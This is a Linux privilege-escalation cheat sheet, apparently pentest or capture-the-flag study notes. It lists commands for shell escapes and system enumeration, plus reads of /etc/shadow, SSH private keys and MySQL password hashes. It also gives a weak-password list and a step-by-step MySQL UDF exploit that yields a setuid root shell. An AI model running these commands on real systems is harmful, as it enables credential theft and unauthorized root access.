# Linux Privilege Escalation

Spawning shell/break restricted shell

    python -c 'import pty; pty.spawn("/bin/sh")'
	
	/bin/sh -i
	
	echo os.system('/bin/bash')
	
	(From within vi)
	:!bash
	
	
Add all binary paths if PATH variable is lacking

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Set up webserver

    python -m SimpleHTTPServer 8080
     

Basic System Information

	uname -a
	cat /etc/*release
	cat /proc/version
    cat /etc/issue
	
Enviromental variables

	cat /etc/profile
	cat/etc/bashrc
	cat  $HOME/.bash_profile
	cat $HOME/.bashrc
	env
	set

Users
	
	Current user:
	id
	
	Other users:
	who
	w
	last
	cat /etc/passwd
	cat /etc/group
    cat /etc/shadow
	
	Find files with specific group permissions:
	find / -type d -group groupname -perm -g=r -print 2>/dev/null
	
	Users with login:
    grep -vE "nologin" /etc/passwd
	
    Check user home directories:
	ls -ahlR /root/
	ls -ahlR /home/
	
	User history:
	cat $HOME/.bash_history
	find -name ".bash_history" -exec cat {} \;

Programs running 
	
	ps -aux
	ps -ef
	
	Root programs:
	ps -aux | grep root


Kernel exploits

	searchsploit 
	check privilege escalation script outputs
	
Installed software locations
	
    /usr/local/
    /usr/local/src
    /usr/local/bin
    /opt/
    /home
    /var/
    /usr/src/

    Debian:
    dpkg -l

    CentOS, OpenSuse, Fedora, RHEL:
    rpm -qa
    
    OpenBSD, FreeBSD:
    pkg_info

Weak/reused/plaintext passwords

	Check database config-files for webapps
	Check databases
	Check for weak passwords
	username:username
    username:username1
    username:root
    username:admin
    username:qwerty
    username:password
	
	Search for log files containing pwd or password:
	find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password'
	
	Search configuration files containing pwd or password:
	find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null

Files

	Find world writable folders:
	find / -perm -0002 -type d 2>/dev/null

	Find writeable for current user
	find / -path /proc -prune -o -writable 2>/dev/null

	
	Find world writable files- exclude proc:
	find / -path /proc -prune -o -perm -0002 -type f 2>/dev/null
	
	Hidden or missed files in web directories:
	ls -alhR /var/www/
	ls -alhR /var/www/html/
	ls -alhR /srv/www/htdocs/
	ls -alhR /usr/local/www/apache22/data/
	ls -alhR /opt/lampp/htdocs/
	
	Web logs:
	cat /etc/httpd/logs/access_log
	cat /etc/httpd/logs/access.log
	cat /etc/httpd/logs/error_log
	cat /etc/httpd/logs/error.log
	cat /var/log/apache2/access_log
	cat /var/log/apache2/access.log
	cat /var/log/apache2/error_log
	cat /var/log/apache2/error.log
	cat /var/log/apache/access_log
	cat /var/log/apache/access.log
	cat /var/log/auth.log
	cat /var/log/chttp.log
	cat /var/log/cups/error_log
	cat /var/log/dpkg.log
	cat /var/log/faillog
	cat /var/log/httpd/access_log
	cat /var/log/httpd/access.log
	cat /var/log/httpd/error_log
	cat /var/log/httpd/error.log
	cat /var/log/lastlog
	cat /var/log/lighttpd/access.log
	cat /var/log/lighttpd/error.log
	cat /var/log/lighttpd/lighttpd.access.log
	cat /var/log/lighttpd/lighttpd.error.log
	cat /var/log/messages
	cat /var/log/secure
	cat /var/log/syslog
	cat /var/log/wtmp
	cat /var/log/xferlog
	cat /var/log/yum.log
	cat /var/run/utmp
	cat /var/webmin/miniserv.log
	cat /var/www/logs/access_log
	cat /var/www/logs/access.log
	ls -alh /var/lib/dhcp3/
	ls -alh /var/log/postgresql/
	ls -alh /var/log/proftpd/
	ls -alh /var/log/samba/
	
	
Look for Inside Service not exposed externally
	
	cat /etc/services
	netstat -anlp
	netstat -ano
	lsof -i TCP -n -P
	lsof -i UDP -n -P
	

Network configuration settings 
	
	cat /etc/resolv.conf
	cat /etc/networks
	cat /etc/hosts
	
	Check firewall settings:
	iptables -L 
	ufw status
	
	arp -e
	route
	netstat -r
	
Suid misconfiguration

	Example programs, also check for file editors/viewers:
	nmap
    vim
    Nano
	Less
	More
	Man 
	
	Find suid/guid files:
	find / -perm -u=s -type f 2>/dev/null
	find / -perm -g=s -type f 2>/dev/null
	
	Find sticky bits - only the owner of the directory or file can delete or rename here:
	find / -perm -1000 -type d 2>/dev/null
	
	List commands current user can run sudo for
	sudo -l
	
	cat /etc/sudoers


Unmounted filesystems

	Look for unmounted filesystems. If found, try to mount and enumerate
	mount -l
	cat /etc/vfstab
	cat /etc/fstab
	
Cronjob

	Look for anything that is owned by privileged user but writable for you

	If cronjob runs scripts look for wildcard options being used and attempt command option injection with filenames https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
	
    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root

SSH Keys

	Check all home directories
	cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key
	
Bad PATH configuration

	check PATH variable for a . 

## MySQL
	
	If root access on MySQL then create a user defined function to escalate to root shell
	https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
	https://www.exploit-db.com/exploits/1518/
	
	Steps:
	copy 1518.so over or lib_mysqludf_sys.so over to target
	(located on kali under sqlmap directory)
	/usr/share/sqlmap/udf/mysql/linux/32/lib_mysqludf_sys.so_
	/usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_
	
	mysql -u root
	use mysql;
	create table hack(line blob);
	insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
	select * from hack into dumpfile '/usr/lib/lib_mysqludf_sys.so';
	create function sys_exec returns some integer soname'lib_mysqludf_sys.so';
	
	Test function:
	select sys_exec('id >/tmp/out; chown user:user /tmp/out');
	quit
	cat /tmp/out
	
	Use function to run a setuid program:
	select sys_exec('chmod + s /tmp/setuid');
	/tmp/setuid
	
Get user hashes from MySQL

	strings /var/lib/mysql/mysql/user.MYD
	
	
Debian MySQL
	
	debian-sys-maint has access to the database and can be used to dump information from the database
	Password is located in /etc/mysql/debian.cnf
	
		
## Binary Exploitation

	strings FILENAME

	strace FILENAME

	ltrace FILENAME

	look for seg faults 

Determine if NX is on

	wmic OS Get DataExecutionPrevention_Available
	
	coreinfo.exe | find "NX" (coreinfo.exe from Sysinternals Suite)
	
	grep ^flags /proc/cpuinfo | head -n1 | egrep --color=auto ' (pae|nx) '
	
Check for ASLR

	cat /proc/sys/kernel/randomize_va_space
	
	With binary (run multiple times and see if address changes)
	
	ldd overflow | grep libc